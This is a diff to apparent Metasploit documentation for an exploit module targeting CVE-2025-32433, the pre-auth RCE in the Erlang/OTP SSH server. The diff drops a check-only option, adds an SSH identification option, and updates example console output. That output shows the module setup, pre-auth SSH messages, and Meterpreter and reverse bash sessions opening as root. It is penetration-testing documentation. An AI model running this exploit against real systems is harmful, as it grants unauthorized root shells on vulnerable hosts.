@@ -49,12 +49,6 @@ docker run -d -p 2223:2223 patched-ssh:latest
 3. Do: `set RHOSTS [IP]`
 4. Do: `run`
 
-## Options
-
-**CHECK_ONLY**
-
-Only check for vulnerability without exploiting. Default: `false`
-
 ## Scenarios
 
 ### Using linux commands (Target 0)
@@ -66,12 +60,11 @@ msf6 exploit(linux/ssh/ssh_erlangotp_rce) > options
 
 Module options (exploit/linux/ssh/ssh_erlangotp_rce):
 
-   Name        Current Setting  Required  Description
-   ----        ---------------  --------  -----------
-   CHECK_ONLY  false            no        Only check for vulnerability without exploiting
-   RHOSTS      172.20.7.45      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT       2222             yes       The target port (TCP)
-   THREADS     1                yes       The number of concurrent threads (max one per host)
+   Name       Current Setting      Required  Description
+   ----       ---------------      --------  -----------
+   RHOSTS     192.168.0.1          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      2222                 yes       The target port (TCP)
+   SSH_IDENT  SSH-2.0-OpenSSH_8.9  yes       SSH client identification string sent to the server
 
 Payload options (cmd/linux/https/x64/meterpreter/reverse_tcp):
 
@@ -84,14 +77,14 @@ Payload options (cmd/linux/https/x64/meterpreter/reverse_tcp):
    FETCH_SRVHOST                      no        Local IP to use for serving payload
    FETCH_SRVPORT     8080             yes       Local port to use for serving payload
    FETCH_URIPATH                      no        Local URI to use for serving payload
-   LHOST             172.20.7.45      yes       The listen address (an interface may be specified)
+   LHOST             192.168.0.1      yes       The listen address (an interface may be specified)
    LPORT             4444             yes       The listen port
 
    When FETCH_FILELESS is false:
 
    Name                Current Setting  Required  Description
    ----                ---------------  --------  -----------
-   FETCH_FILENAME      fxCcJWmo         no        Name to use on remote system when storing payload; cannot contain spaces or slashes
+   FETCH_FILENAME      tVzpeXtmX        no        Name to use on remote system when storing payload; cannot contain spaces or slashes
    FETCH_WRITABLE_DIR  /tmp             yes       Remote writable dir to store payload; cannot contain spaces
 
 Exploit target:
@@ -103,15 +96,21 @@ Exploit target:
 View the full module info with the info, or info -d command.
 
 msf6 exploit(linux/ssh/ssh_erlangotp_rce) > run
-[*] Started reverse TCP handler on 172.20.7.45:4444 
-[*] 172.20.7.45:2222      - ssh://172.20.7.45:2222 - Starting exploit for CVE-2025-32433
-[+] 172.20.7.45:2222      - ssh://172.20.7.45:2222 - Received banner: SSH-2.0-Erlang/5.1.4.7
-[*] 172.20.7.45:2222      - ssh://172.20.7.45:2222 - Sending SSH_MSG_KEXINIT...
-[*] 172.20.7.45:2222      - ssh://172.20.7.45:2222 - Sending SSH_MSG_CHANNEL_OPEN...
-[*] 172.20.7.45:2222      - ssh://172.20.7.45:2222 - Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
-[+] 172.20.7.45:2222      - ssh://172.20.7.45:2222 - Payload sent successfully
+[*] Started reverse TCP handler on 192.168.0.1:4444 
+[*] 192.168.0.1:2222 - Running automatic check ("set AutoCheck false" to disable)
+[*] 192.168.0.1:2222 - Starting scanner for CVE-2025-32433
+[*] 192.168.0.1:2222 - Sending SSH_MSG_KEXINIT...
+[*] 192.168.0.1:2222 - Sending SSH_MSG_CHANNEL_OPEN...
+[*] 192.168.0.1:2222 - Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
+[+] 192.168.0.1:2222 - The target is vulnerable.
+[*] 192.168.0.1:2222 - Starting exploit for CVE-2025-32433
+[+] 192.168.0.1:2222 - Received banner: SSH-2.0-Erlang/5.1.4.7
+[*] 192.168.0.1:2222 - Sending SSH_MSG_KEXINIT...
+[*] 192.168.0.1:2222 - Sending SSH_MSG_CHANNEL_OPEN...
+[*] 192.168.0.1:2222 - Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
+[+] 192.168.0.1:2222 - Payload sent successfully
 [*] Sending stage (3045380 bytes) to 172.17.0.2
-[*] Meterpreter session 1 opened (172.20.7.45:4444 -> 172.17.0.2:37326) at 2025-04-25 10:18:19 +0400
+[*] Meterpreter session 1 opened (192.168.0.1:4444 -> 172.17.0.2:35770) at 2025-04-27 20:23:02 +0400
 
 meterpreter > 
 ```
@@ -125,18 +124,17 @@ msf6 exploit(linux/ssh/ssh_erlangotp_rce) > options
 
 Module options (exploit/linux/ssh/ssh_erlangotp_rce):
 
-   Name        Current Setting  Required  Description
-   ----        ---------------  --------  -----------
-   CHECK_ONLY  false            no        Only check for vulnerability without exploiting
-   RHOSTS      172.20.7.45      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT       2222             yes       The target port (TCP)
-   THREADS     1                yes       The number of concurrent threads (max one per host)
+   Name       Current Setting      Required  Description
+   ----       ---------------      --------  -----------
+   RHOSTS     192.168.0.1          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      2222                 yes       The target port (TCP)
+   SSH_IDENT  SSH-2.0-OpenSSH_8.9  yes       SSH client identification string sent to the server
 
 Payload options (cmd/unix/reverse_bash):
 
    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
-   LHOST  172.20.7.45      yes       The listen address (an interface may be specified)
+   LHOST  192.168.0.1      yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port
 
 Exploit target:
@@ -148,14 +146,20 @@ Exploit target:
 View the full module info with the info, or info -d command.
 
 msf6 exploit(linux/ssh/ssh_erlangotp_rce) > run
-[*] Started reverse TCP handler on 172.20.7.45:4444 
-[*] 172.20.7.45:2222      - ssh://172.20.7.45:2222 - Starting exploit for CVE-2025-32433
-[+] 172.20.7.45:2222      - ssh://172.20.7.45:2222 - Received banner: SSH-2.0-Erlang/5.1.4.7
-[*] 172.20.7.45:2222      - ssh://172.20.7.45:2222 - Sending SSH_MSG_KEXINIT...
-[*] 172.20.7.45:2222      - ssh://172.20.7.45:2222 - Sending SSH_MSG_CHANNEL_OPEN...
-[*] 172.20.7.45:2222      - ssh://172.20.7.45:2222 - Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
-[+] 172.20.7.45:2222      - ssh://172.20.7.45:2222 - Payload sent successfully
-[*] Command shell session 13 opened (172.20.7.45:4444 -> 172.17.0.2:44366) at 2025-04-25 10:21:05 +0400
+[*] Started reverse TCP handler on 192.168.0.1:4444 
+[*] 192.168.0.1:2222 - Running automatic check ("set AutoCheck false" to disable)
+[*] 192.168.0.1:2222 - Starting scanner for CVE-2025-32433
+[*] 192.168.0.1:2222 - Sending SSH_MSG_KEXINIT...
+[*] 192.168.0.1:2222 - Sending SSH_MSG_CHANNEL_OPEN...
+[*] 192.168.0.1:2222 - Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
+[+] 192.168.0.1:2222 - The target is vulnerable.
+[*] 192.168.0.1:2222 - Starting exploit for CVE-2025-32433
+[+] 192.168.0.1:2222 - Received banner: SSH-2.0-Erlang/5.1.4.7
+[*] 192.168.0.1:2222 - Sending SSH_MSG_KEXINIT...
+[*] 192.168.0.1:2222 - Sending SSH_MSG_CHANNEL_OPEN...
+[*] 192.168.0.1:2222 - Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
+[+] 192.168.0.1:2222 - Payload sent successfully
+[*] Command shell session 1 opened (192.168.0.1:4444 -> 172.17.0.2:59042) at 2025-04-27 20:24:41 +0400
 
 whoami
 root
